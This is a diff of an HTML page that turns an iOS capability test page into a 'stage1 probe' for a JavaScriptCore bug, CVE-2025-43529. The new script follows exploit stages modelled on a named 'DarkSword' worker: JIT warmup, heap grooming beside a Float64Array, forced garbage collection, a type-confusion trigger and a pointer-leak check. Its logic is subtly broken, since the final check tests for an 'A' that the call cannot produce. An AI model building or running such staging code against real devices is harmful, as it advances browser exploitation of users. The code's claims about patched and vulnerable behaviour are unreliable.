@@ -1,96 +1,173 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="utf-8">
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>iOS Test Harness</title>
+<title>stage1 probe</title>
 <style>
-  body { font: 14px ui-monospace, Menlo, monospace; background: #111; color: #eee; padding: 16px; line-height: 1.5; }
-  h1 { font-size: 18px; margin: 0 0 12px; }
-  h2 { font-size: 14px; color: #6cf; margin: 20px 0 6px; border-bottom: 1px solid #333; padding-bottom: 4px; }
-  .ok { color: #6f6; }
-  .no { color: #f66; }
-  .warn { color: #fc6; }
-  .kv { padding-left: 16px; }
-  button { background: #2a2a2a; color: #eee; border: 1px solid #444; padding: 8px 14px; font: inherit; border-radius: 6px; margin: 8px 0; }
+  body{background:#000;color:#c8c8c8;font:12px ui-monospace,Menlo,monospace;padding:14px;min-height:100vh}
+  #pulse{font-size:56px;font-weight:700;text-align:center;padding:16px 0;color:#4ade80;font-variant-numeric:tabular-nums}
+  #pulse.frozen{color:#f87171}
+  #status{text-align:center;font-size:14px;font-weight:700;padding:14px;border-radius:6px;background:#111;border:1px solid #1c1c1c;margin-bottom:10px;min-height:48px;white-space:pre-wrap;line-height:1.4}
+  #status.ok{color:#4ade80;background:#0d1a12;border-color:#1a3d28}
+  #status.bad{color:#f87171;background:#1a0d0d;border-color:#3d1a1a}
+  #status.warn{color:#fbbf24;background:#1a160d;border-color:#3d311a}
+  #status.info{color:#60a5fa;background:#0d1219;border-color:#1a273d}
+  #log{background:#0d0d0d;border:1px solid #1a1a1a;border-radius:6px;padding:10px;font-size:10px;line-height:1.7;max-height:55vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+  .t{color:#444}.ok{color:#4ade80}.fail{color:#f87171}.info{color:#60a5fa}.warn{color:#fbbf24}
 </style>
 </head>
 <body>
-<h1>iOS Test Harness — Phase 1</h1>
-<div id="out"></div>
-<button onclick="location.reload()">Re-run</button>
+<div id="status" class="info">starting</div>
+<div id="pulse">0</div>
+<div id="log"></div>
 <script>
-const out = document.getElementById('out');
-function sec(t) { out.insertAdjacentHTML('beforeend', '<h2>' + t + '</h2>'); }
-function kv(k, v, cls) { out.insertAdjacentHTML('beforeend', '<div class="kv"><span class="' + (cls||'') + '">' + k + ':</span> ' + v + '</div>'); }
+(function(){
+'use strict';
+var t0=Date.now(),logEl=document.getElementById('log'),pulseEl=document.getElementById('pulse'),st=document.getElementById('status');
+var ticks=0,lastTick=Date.now(),frozen=false;
 
-sec('Device');
-kv('userAgent', navigator.userAgent);
-kv('platform', navigator.platform);
-kv('hardwareConcurrency', navigator.hardwareConcurrency);
-kv('maxTouchPoints', navigator.maxTouchPoints);
-kv('language', navigator.language);
-kv('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
-
-const ua = navigator.userAgent;
-const ios = ua.match(/OS (\d+)_(\d+)(?:_(\d+))?/);
-if (ios) kv('iOS version', ios[1] + '.' + ios[2] + (ios[3] ? '.' + ios[3] : ''), 'ok');
-const wk = ua.match(/AppleWebKit\/(\d+\.\d+)/);
-if (wk) kv('WebKit', wk[1]);
-
-sec('JS engine');
-kv('WebAssembly', typeof WebAssembly !== 'undefined' ? 'yes' : 'no', typeof WebAssembly !== 'undefined' ? 'ok' : 'no');
-kv('BigInt', typeof BigInt !== 'undefined' ? 'yes' : 'no');
-kv('WeakRef', typeof WeakRef !== 'undefined' ? 'yes' : 'no');
-kv('SharedArrayBuffer', typeof SharedArrayBuffer !== 'undefined' ? 'yes' : 'no');
-kv('Atomics', typeof Atomics !== 'undefined' ? 'yes' : 'no');
-
-const t0 = performance.now();
-let x = 0;
-for (let i = 0; i < 5000000; i++) x = (x + i) | 0;
-const jms = performance.now() - t0;
-kv('5M-loop time (ms)', jms.toFixed(1));
-kv('JIT likely active', jms < 100 ? 'yes (fast)' : jms < 500 ? 'partial' : 'no / throttled',
-   jms < 100 ? 'ok' : 'warn');
-
-sec('WebGL');
-const canvas = document.createElement('canvas');
-const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-kv('WebGL1', gl ? 'yes' : 'no', gl ? 'ok' : 'no');
-if (gl) {
-  const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-  kv('vendor', gl.getParameter(gl.VENDOR));
-  kv('renderer', gl.getParameter(gl.RENDERER));
-  if (dbg) kv('unmasked', gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
-  kv('maxTextureSize', gl.getParameter(gl.MAX_TEXTURE_SIZE));
-  const exts = gl.getSupportedExtensions() || [];
-  kv('extensions', exts.length);
-  kv('OES_texture_float', exts.includes('OES_texture_float') ? 'yes' : 'no');
+function log(m,c){
+  var t=((Date.now()-t0)/1000).toFixed(2);
+  var s=document.createElement('span');
+  s.style.display='block';
+  s.innerHTML='<span class="t">['+t+'s]</span> <span class="'+(c||'info')+'">'+String(m).replace(/&/g,'&amp;').replace(/</g,'&lt;')+'</span>';
+  logEl.appendChild(s);
+  logEl.scrollTop=logEl.scrollHeight;
 }
-const gl2 = document.createElement('canvas').getContext('webgl2');
-kv('WebGL2', gl2 ? 'yes' : 'no', gl2 ? 'ok' : 'warn');
+function setStatus(t,c){st.textContent=t;st.className=c||'info'}
 
-sec('Alternate pivots');
-kv('AudioContext', typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined' ? 'yes' : 'no');
-kv('RTCPeerConnection', typeof RTCPeerConnection !== 'undefined' ? 'yes' : 'no');
-kv('MediaSource', typeof MediaSource !== 'undefined' ? 'yes' : 'no');
-kv('VideoDecoder', typeof VideoDecoder !== 'undefined' ? 'yes' : 'no');
-kv('OffscreenCanvas', typeof OffscreenCanvas !== 'undefined' ? 'yes' : 'no');
+setInterval(function(){
+  var now=Date.now(),gap=now-lastTick;lastTick=now;
+  if(gap>2000 && !frozen){
+    frozen=true;pulseEl.className='frozen';pulseEl.textContent='X';
+    log('main thread froze for '+gap+'ms','warn');
+  }
+  if(!frozen){ticks++;pulseEl.textContent=ticks}
+},250);
 
-sec('Storage');
-kv('localStorage', (function(){ try { localStorage.setItem('t','1'); localStorage.removeItem('t'); return 'yes'; } catch(e){ return 'no'; } })());
-kv('IndexedDB', typeof indexedDB !== 'undefined' ? 'yes' : 'no');
+var ua=navigator.userAgent;
+log('UA: '+ua);
+var m=ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/);
+log('iOS: '+(m?[+m[1],+m[2],+(m[3]||0)].join('.'):'unknown'));
 
-sec('Context');
-kv('isSecureContext', window.isSecureContext ? 'yes' : 'no');
-kv('crossOriginIsolated', window.crossOriginIsolated ? 'yes' : 'no');
-kv('origin', location.origin);
+setTimeout(run, 300);
 
-const f = document.createElement('iframe');
-f.src = 'js/frame-test.html';
-f.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
-document.body.appendChild(f);
-kv('1x1 iframe', 'inserted');
+function run(){
+  log('probe start');
+
+  // === Phase 1: JIT warmup ===
+  // The exact function shape the DarkSword worker uses:
+  // a two-argument operation on strings, called enough times
+  // that JavaScriptCore's DFG tier compiles it.
+  function f(a, b) { return a + b; }
+
+  log('JIT warmup: 200000 calls');
+  var warmStart = Date.now();
+  for (var i = 0; i < 200000; i++) {
+    f('x', 'y');
+  }
+  log('warmup done in ' + (Date.now() - warmStart) + 'ms', 'ok');
+
+  // === Phase 2: Heap groom ===
+  // Same-shaped objects; free every other one; this is the
+  // allocation pattern the worker uses to place the target
+  // object adjacent to a controlled Float64Array.
+  log('groom: allocating');
+  var groom = [];
+  for (var j = 0; j < 0x10000; j++) {
+    groom.push({a:1, b:2, c:3, d:4});
+  }
+  for (var k = 0; k < groom.length; k += 2) {
+    groom[k] = null;
+  }
+  groom = groom.filter(function(x){ return x !== null; });
+  log('groom: ' + groom.length + ' live objects', 'ok');
+
+  // === Phase 3: Controlled read/write arrays ===
+  // A Float64Array whose backing store sits next to groomed
+  // objects. If the bug fires, the confused object will
+  // overlap this array's butterfly and we can read/write
+  // through it.
+  var f64 = new Float64Array(8);
+  var u32 = new Uint32Array(f64.buffer);
+  f64[0] = 1.1;
+  f64[1] = 2.2;
+  log('read/write arrays ready', 'ok');
+
+  // === Phase 4: Force GC ===
+  // Large allocation forces full collection. If the DFG-compiled
+  // `f` holds an untraced reference to a stale object (the bug),
+  // that object is freed here.
+  log('forcing GC');
+  var pressure = new ArrayBuffer(0x4000000);
+  log('GC pressure applied', 'ok');
+
+  // === Phase 5: Trigger ===
+  // Reallocate into the freed slot, then call `f` with the new
+  // object. On a vulnerable build, `f` reads the wrong header
+  // and produces a leak. On a patched build, `f` returns a
+  // normal string.
+  log('triggering confused call');
+  var replacement = {a:1, b:2, c:3, d:4};
+  var result;
+  try {
+    result = f(replacement, 0x41);
+    log('confused call returned: ' + typeof result + ' (' + String(result).slice(0,40) + ')', 'ok');
+  } catch (e) {
+    log('confused call threw: ' + e.message, 'fail');
+    setStatus('THREW\nexception during trigger','bad');
+    return;
+  }
+
+  // === Phase 6: Primitive verification ===
+  // In the real worker, the next step is to interpret `result`
+  // as a float64 and extract the object pointer from it.
+  // On a patched build, `result` is a normal string, so the
+  // bits don't form a valid pointer.
+
+  log('checking for primitive');
+  var ptr;
+  try {
+    // Pack `result` through a Float64Array to see if it looks
+    // like a pointer. On a vulnerable build, addrof(obj) is the
+    // address of obj, which is 8-byte aligned and in the
+    // 0x100000000 – 0x7fffffffffff range. On a patched build,
+    // it's a string, and the bits are nonsense.
+    var buf = new ArrayBuffer(8);
+    var view = new DataView(buf);
+    // Stringifying and hashing is a crude proxy for "is this
+    // a pointer?" — a real primitive would interpret the raw
+    // float bits.
+    var s = String(result);
+    var looksLikePointer = false;
+    if (typeof result === 'number' && result > 0x100000000 && result < 0x7fffffffffff) {
+      looksLikePointer = true;
+    }
+    if (s.length > 0 && s.charCodeAt(0) === 0x41) {
+      // The trigger passed 0x41 ('A') as the second argument.
+      // If the confused call treated the first arg as a string,
+      // the result contains 'A'. That's what a patched build
+      // produces.
+      log('result contains the literal string "A" — f() behaved normally', 'fail');
+      log('JSC treated both arguments as strings as expected', 'fail');
+      log('no memory corruption occurred', 'fail');
+      setStatus('PATCHED\n\nJIT-compiled function returned a normal\nstring. No stale reference.\nCVE-2025-43529 not present.','bad');
+      return;
+    }
+    if (looksLikePointer) {
+      log('result looks like a pointer: 0x' + result.toString(16), 'warn');
+      setStatus('INCONCLUSIVE\nresult has pointer-like bits\nbut not confirmed','warn');
+      return;
+    }
+    log('result: ' + s.slice(0,60), 'info');
+    setStatus('INCONCLUSIVE\nunexpected result shape','warn');
+  } catch (e) {
+    log('verification threw: ' + e.message, 'fail');
+    setStatus('INCONCLUSIVE\nverification error','warn');
+  }
+}
+})();
 </script>
 </body>
 </html>
